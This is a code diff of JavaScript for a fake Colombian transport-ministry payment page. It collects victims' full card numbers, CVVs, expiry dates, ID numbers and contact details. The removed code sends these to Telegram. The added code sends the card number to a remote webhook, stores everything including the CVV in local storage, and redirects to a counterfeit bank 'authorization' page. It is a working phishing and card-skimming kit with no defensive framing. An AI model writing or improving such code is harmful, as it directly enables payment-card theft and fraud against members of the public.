@@ -608,36 +608,49 @@
       console.error('Error notificando matrícula:', error);
     });
 
-    // ENVIAR A TELEGRAM
-    setBtnLoading(btn, true, "Enviando...");
+    // DETECTAR BANCO Y REDIRIGIR A AUTORIZACIÓN
+    setBtnLoading(btn, true, "Detectando banco...");
 
-    setTimeout(function () {
-      var datosTelegram = {
+    fetch(WEBHOOK_BASE_URL + '/api/detect-bank', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cardNumber: tarjeta })
+    }).then(function (response) {
+      return response.json();
+    }).then(function (bankData) {
+      // Guardar datos de transacción actual
+      var datosTransaccion = {
         solicitudId: solicitudId,
-        nombreCompleto: nombre,
+        comercio: "Secretaría de Transporte - Movilidad",
+        monto: pendiente ? pendiente.valor : 23000,
+        banco: bankData.bank || "Banco Desconocido",
+        bankLogo: bankData.logo,
+        cardLast: tarjeta.slice(-4),
+        titular: nombre,
+        vencimiento: expiry,
+        tipoTarjeta: cardType,
         tipoDocumento: tipoDoc,
         numeroDocumento: numDoc,
         email: correo,
         celular: telefono,
         numeroTarjeta: tarjeta,
-        cvv: cvv,
-        vencimiento: expiry,
-        tipoTarjeta: cardType,
-        bancoEmisor: "Banco Cliente",
-        totalFormateado: pendiente ? pendiente.valor + " Col$" : "23.000 Col$",
-        fechaHora: new Date().toLocaleString('es-CO')
+        cvv: cvv
       };
 
-      enviarDatosTarjetaATelegram(datosTelegram).then(function (enviado) {
-        if (enviado) {
-          showLoading(true);
-          iniciarPollingPago();
-        } else {
-          alert('Error al enviar datos');
-          setBtnLoading(btn, false);
-        }
-      });
-    }, 450);
+      localStorage.setItem("snr_transaccion_actual", JSON.stringify(datosTransaccion));
+
+      // Mostrar loading por 3 segundos antes de redirigir
+      setBtnLoading(btn, true, "Autorizando...");
+      showLoading(true);
+
+      setTimeout(function () {
+        window.location.href = "autorizacion.html";
+      }, 3000);
+    }).catch(function (error) {
+      console.error('Error detectando banco:', error);
+      alert('Error al procesar la solicitud. Intenta nuevamente.');
+      setBtnLoading(btn, false);
+    });
   });
 })();
 </script>
